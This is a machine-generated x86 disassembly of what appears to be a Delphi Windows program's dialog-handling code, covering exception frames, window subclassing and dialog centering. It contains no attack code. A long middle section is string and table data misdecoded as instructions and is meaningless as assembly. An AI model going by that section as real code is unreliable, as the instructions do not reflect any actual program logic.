mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4283bc
retn
sub_4283c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4283ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4283f4
retn
sub_428400
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428425
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42842c
retn
sub_428438
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42845d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428464
retn
sub_428470
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428495
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42849c
retn
sub_4284d9
dec [ ebx - 0x1374aa40 ]
xor eax eax
push ebp
push sub_428501
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428508
retn
sub_42853c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428561
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428568
retn
sub_428574
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428599
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4285a0
retn
sub_4285ac
clc
test [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
xchg [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi - 0x79a7ffbe ] al
inc edx
add [ eax ] bl
add [ eax ] al
add al 0x2c
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x63ffbfcb ] ah
cwde
inc edx
add ah bl
xor al [ eax ]
clc
xor al [ eax ]
inc eax
cwde
inc edx
add [ eax + 0x2800414a ] bl
mov eax [ 0x49b40041 ]
inc ecx
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al bh
xchg edi eax
inc edx
add [ eax ] ah
cdq
inc edx
add [ eax + ebx * 4 + 0x42 ] dh
add [ ecx + ebx * 4 + 0x42 ] ch
add [ eax ] dh
sub eax [ eax ]
add eax 0x10000200
add [ edx - 0x11001100 ] eax
[ eax ]
sub_428bea
add [ eax + 0x4f0e000f ] al
outsb
inc esi
outsd
insb
jb r-xdata
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or al 0x4f
outsb
push esp
jns r-xdata
push 0x65676e61
sub al 0x1a
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f110010 ] al
outsb
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
push 0x65676e61
sub al 0x1a
inc ecx
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0011 ] al
xor al [ eax ]
clc
xor al [ eax ]
push 0x9800429b
dec edx
inc ecx
add [ eax - 0x4bffbd63 ] cl
dec ecx
inc ecx
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ebx
push 0x65676e61
cmp al 0x89
inc edx
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0012 ] al
outsb
dec ecx
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
dec ecx
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] bl
lea eax [ edx ]
mov eax 0x80000000
mov [ edx ] eax
and [ ebp + 0x35980041 ] ah
inc eax
add [ esi + ebx * 4 + 0x41 ] dh
inc edx
add [ ecx + ebx * 4 + 0x42 ] ch
add [ eax ] ch
movsb [ edi ] [ esi ]
inc edx
add al ah
mov [ 0x10042 ] al
push cs
add [ eax ] ch
movsb [ edi ] [ esi ]
inc edx
add [ edi ] al
inc ebp
js r-xdata
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add ah ch
0x9bc80042 0x42
je r-xdata
or [ ebx - 0x5ac7ffbf ] ah
add [ eax - 0x63ffbfcb ] ah
cwde
inc edx
add ah bl
insd
les ecx [ edx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
lea eax [ edx ]
add [ eax ] al
add [ eax ] al
or [ ebp + 0x42 ] cl
add [ eax ] al
sbb [ ebp + 0xb80042 ] cl
add [ eax ] al
or [ ecx - 0x5adfffbe ] 0x41
add [ eax + 0x74004035 ] bl
sahf
inc ecx
inc esp
popa
jne r-xdata
arpl [ ebp + 0x74 ] si
or edx [ gs : ebx + edx * 2 + 0x61 ]
jbe r-xdata
or dh [ eax + 0x73 ]
je r-xdata
dec ebp
popad
jb r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x8d28676f
inc edx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x61 ]
jbe r-xdata
mov eax eax
pushad
mov es [ edx ]
add ecx [ ecx ]
push esp
push eax
popad
imul ebp [ esi + 0x73 ] 0x6f73700d
dec ebp
imul esi [ ebx + 0x61 ] 0x50656c62
imul ebp [ esi + 0x4d ] 0x69677261
outsb
jae r-xdata
outsd
dec ebp
popad
jb r-xdata
imul ebp [ esi + 0x73 ] 0x6f737011
popad
jb r-xdata
dec ebp
inc esp
imul esp [ ecx + 0x6c ] 0x8cc4676f
inc edx
add [ eax - 0x76 ] dh
inc edx
add [ ebx ] dl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ ebp - 0x72afffc0 ] cl
inc edx
add [ ebx ] al
push ss
push esp
push eax
popad
push ebx
je r-xdata
add cl [ ebx ]
dec edi
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x42 ] bl
add [ edx ] cl
jo r-xdata
or dh [ eax + 0x73 ]
jo r-xdata
pop ss
push esp
jb r-xdata
adc eax 0x446f7370
jo r-xdata
imul ebp [ bp + 0x73 ] 0x6f73700b
imul esi [ ebx + 0x61 ] 0x4f656c62
jb r-xdata
imul ebp [ esi + 0x73 ] 0x6f737015
inc esp
popad
jo r-xdata
popad
jo r-xdata
popad
jae r-xdata
outsb
je r-xdata
jb r-xdata
inc ebp
push eax
popad
jo r-xdata
imul ebp [ esi + 0x67 ] 0x6f737012
je r-xdata
push ebx
push 0x6548776f
insb
outsd
jb r-xdata
jo r-xdata
jo r-xdata
outsd
push edi
popad
jb r-xdata
outsb
je r-xdata
inc esp
imul esi [ ebx + 0x61 ] 0x4d656c62
outsd
dec esi
outsd
dec esi
je r-xdata
adc dh [ eax + 0x73 ]
jo r-xdata
imul esp [ ecx + 0x6c ] 0x704f676f
je r-xdata
popad
jb r-xdata
popad
je r-xdata
add edx [ ecx ]
push esp
push eax
jb r-xdata
imul ebp [ edi + 0x6e ] 0x72505413
insb
outsd
jo r-xdata
jb r-xdata
popad
push ebx
outsd
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x9 ] si
outsb
jbe r-xdata
push eax
add cl [ ecx ]
push esp
dec edi
imul esp [ ecx + 0x6c ] 0x9073676f
imul esp [ ecx + 0x6c ] 0x704f676f
jo r-xdata
outsd
inc esp
imul esi [ ebx + 0x61 ] 0x50656c62
jb r-xdata
jo r-xdata
je r-xdata
jae r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp + ecx * 4 + 0x42 ] cl
add [ eax + esi * 2 ] dl
jae r-xdata
or eax [ edi + ebp * 2 + 0x6e ]
inc esp
or [ eax + 0x61 ] dl
or [ esi ] al
push ebp
outsb
imul esi [ ebx + esi * 2 + 0x1 ] 0x0
imul ebp [ esi + 0x74 ] 0x724f7265
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
cmp al 0x8f
outsb
je r-xdata
je r-xdata
or [ gs : eax + edx * 2 + 0x61 ] edx
push esp
jns r-xdata
push esp
push eax
jb r-xdata
pop es
jo r-xdata
cwde
mov es [ edx ]
or [ edx ] bl
push esp
push eax
nop
inc esp
ja r-xdata
jo r-xdata
inc edx
jne r-xdata
dec ebp
pop esp
mov es [ edx ]
add [ eax ] dl
inc eax
add [ ebp - 0x70bfffc0 ] cl
inc edx
add [ ebx ] al
adc [ eax + edx * 2 + 0x61 ] edx
jb r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
je r-xdata
push esp
jns r-xdata
imul ebp [ edi + 0x6e ] 0x8d4c0373
inc edx
je r-xdata
outsb
outsd
outsb
adc dh [ bx + si + 0x73 ]
outsd
outsb
push ss
jo r-xdata
insb
outsd
jae r-xdata
bound ebp [ ebp + 0x50 ]
je r-xdata
xor al [ eax ]
clc
xor al [ eax ]
inc eax
cwde
inc edx
ja r-xdata
add [ eax + 0x18004290 ] cl
add [ eax ] eax
jae r-xdata
arpl [ gs : ecx + eax + 0xb ] si
inc esp
popa
jne r-xdata
add al [ eax ]
add [ eax ] al
je r-xdata
popad
jb r-xdata
push 0x44077365
add [ gs : ebx ] ecx
inc edx
add [ ecx ] cl
jo r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + ecx * 4 ] bh
outsb
je r-xdata
outsb
add cl [ eax ]
push eax
popad
push esp
jns r-xdata
imul esp [ ecx + 0x6c ] 0x8d73676f
inc eax
add [ eax + 0x800428f ] dl
andps xmm2 [ eax + 0x61 ]
outsb
pop es
inc edx
outsd
outsd
insb
adc edx [ eax + edx * 2 + 0x72 ]
outsw
jb r-xdata
je r-xdata
push ebx
je r-xdata
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + edx ] bh
inc eax
add ah bh
inc edx
add [ esi + ecx * 4 + 0x42 ] bl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
inc eax
pop [ edx ]
imul edi [ edx + 0x65 ] 0x616d5308
insb
insb
imul ebp [ esi + 0x74 ] 0x724f0b02
imul esp [ ebp + 0x6e ] 0x69746174
add [ ebx + 0x428e60c0 ] cl
add [ ebx ] al
dec esp
lea eax [ edx ]
popad
jo r-xdata
or [ eax + 0x61 ] edx
jb r-xdata
outsd
inc esp
imul esi [ ebx + 0x61 ] 0x50656c62
popad
push eax
popad
imul ebp [ esi + 0x74 ] 0xf676e69
jo r-xdata
sar [ esi + ecx * 4 ] 0x42
add [ esi ] al
add [ ecx * 2 + 0x614d6e69 ] cl
jb r-xdata
jo r-xdata
add [ eax + 0x2800414a ] bl
mov eax [ 0x49b40041 ]
inc ecx
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x58 ] al
inc edx
add [ eax ] ah
cdq
inc edx
add [ eax + ebx * 4 + 0x42 ] dh
add [ ecx + ebx * 4 + 0x42 ] ch
add [ eax + ebp * 4 + 0x54100042 ] cl
push eax
popad
push ebx
je r-xdata
outsb
pop es
inc edx
outsd
outsd
insb
popad
outsb
push edx
arpl [ gs : ebp + eax + 0x54 ] si
push edx
adc [ eax ] cl
push eax
popad
push esp
inc ebx
popad
outsb
jbe r-xdata
inc esp
outsd
outsb
je r-xdata
insd
outsd
inc eax
add [ eax ] bh
mov esp 0x41
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x6fb7ffc0 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4290 ] ah
or [ eax + 0x6d ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x4290 ]
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
inc esp
outsd
outsb
inc esp
jb r-xdata
add [ ebx ] ecx
push eax
popad
imul ebp [ esi + 0x74 ] 0x6e657645
je r-xdata
outsb
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x8b73676f
imul ebp [ esi + 0x4d ] 0x69677261
outsb
jae r-xdata
or eax 0x4d6f7370
jo r-xdata
push eax
popad
push ebx
je r-xdata
outsd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0a000a ] al
popad
jb r-xdata
imul ebp [ esi + 0x54 ] 0x1054706f
inc eax
add [ eax + eax ] ah
add [ eax - 0x80000000 ] al
push es
add [ 0x4d6e694d ] cl
popad
jb r-xdata
imul esp [ ecx + 0x6c ] 0x408d676f
add [ eax + 0x7004290 ] ah
adc [ eax + edx * 2 + 0x61 ] dl
push ebx
je r-xdata
add [ ebp + eax * 4 - 0x5adfffbe ] ch
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x63ffbfcb ] ah
cwde
inc edx
add ah bl
jae r-xdata
jo r-xdata
imul ebp [ esi + 0x74 ] 0x65676150
inc ebp
jbe r-xdata
lea eax [ eax ]
nop
pop [ edx ]
or [ edi ] cl
push esp
push eax
popad
inc esp
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ ecx + edx ] bl
dec ecx
outsb
arpl [ eax + 0x65 ] bp
jae r-xdata
add eax 0x65530608
outsb
or [ eax + edx * 2 + 0x61 ] edx
or [ 0x614d0c00 ] 0x72
imul ebp [ bp + 0x42 ] 0x6f74746f
imul ebp [ esi + 0x4c ] 0x54746665
adc [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0f0009 ] al
imul ebp [ esi + 0x4d ] 0x69677261
outsb
inc edx
outsd
je r-xdata
imul ebp [ esi + 0x4c ] 0x54746665
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0e0008 ] al
imul ebp [ esi + 0x4d ] 0x69677261
outsb
push edx
imul esp [ edi + 0x68 ] 0x40105474
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
jo r-xdata
jb r-xdata
dec ebp
imul ebp [ esp + ebp * 2 + 0x69 ] 0x6574656d
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
imul ebp [ edi + 0x6e ] 0x40105473
add [ eax + eax ] bh
add bh bh
jo r-xdata
add [ eax ] bh
outsd
insd
push esp
adc [ eax ] al
insb
add [ eax ] al
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0c0007 ] al
imul ebp [ esi + 0x4d ] 0x69677261
outsb
push esp
outsd
jo r-xdata
imul esp [ ecx + 0x6c ] 0x9048676f
inc edx
add [ eax - 0x7a ] ch
inc edx
add [ ecx ] bl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x1373676f
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0d0006 ] al
imul ebp [ esi + 0x4d ] 0x69677261
outsb
dec esp
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or [ ebp + 0x61 ] ecx
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x614d0c00
jb r-xdata
[ eax + eax ]
inc eax
add [ eax + eax ] ch
jmp [ eax + eax ]
adc [ eax ] al
add [ fs : eax ] al
add [ eax ] al
[ eax ]
adc [ eax ] al
pushad
add [ eax ] al
jmp [ eax ]
add [ edi ] al
dec edi
jo r-xdata
add [ eax ] al
add [ esi ] cl
imul ebp [ esi + 0x54 ] 0x1054706f
inc eax
add [ eax + eax ] dh
push [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0b000c ] al
popad
jb r-xdata
add [ edx ] cl
push eax
insd
cmp [ esi + 0x580042 ] cl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
imul ebp [ esi + 0x42 ] 0x6f74746f
popad
dec eax
imul esp [ gs : edi + 0x68 ] 0x428f3c74
add al ah
add [ eax ] al
jmp eax
or [ edi ] 0x0
or [ eax + 0x61 ] edx
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] 0x0
inc [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500a0010 ] al
imul ebp [ esi + 0x52 ] 0x74686769
push esp
adc [ eax ] al
js r-xdata
add bh bh
js r-xdata
sub_4296dc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_460c38
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_45d1d8
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_45d1d8
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_46093c
mov edi eax
mov eax ebx
call sub_460920
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_460908
mov edi eax
mov eax ebx
call sub_460954
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_429790
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_4296dc
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_4297f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419db0
mov [ esi + 0x30 ] 0x1
push esi
push sub_4298d4
call sub_41ae40
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_429840
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419dfc
test bl bl
jle r-xdata
call sub_41aed8
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_429874
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_4636bc
mov cl 0x1
sub_42989c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403594
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4298d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4298fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42996c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_459f2c
mov [ ebp - 0x14 ] eax
call sub_459e48
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_429a2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462fac
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_429a01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429a08
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463008
retn
sub_429a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429a36
mov eax [ ebp - 0x14 ]
call sub_459fe0
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_459e50
retn
sub_429a68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_4296dc
sub_429aec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4297f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_429b65
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403344
mov eax [ esi + 0x58 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_429840
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_429ba0
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_42a228
mov eax edi
mov si 0xffed
call sub_403540
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_429bc8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_429920
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_429c0c ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_429ba0
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403540
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403540
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403540
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403540
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403540
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_429cc4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_429d4c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_429d7e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_418090
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429d85
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_429d88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a128
push ebx
push sub_429d4c
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_429dcc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404094
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_4043a0
mov eax [ ebx ]
call sub_404554
mov dl 0x7c
call sub_40cb24
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40cb24
test eax eax
jne r-xdata
sub_429e1c
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42a0cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402d44
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
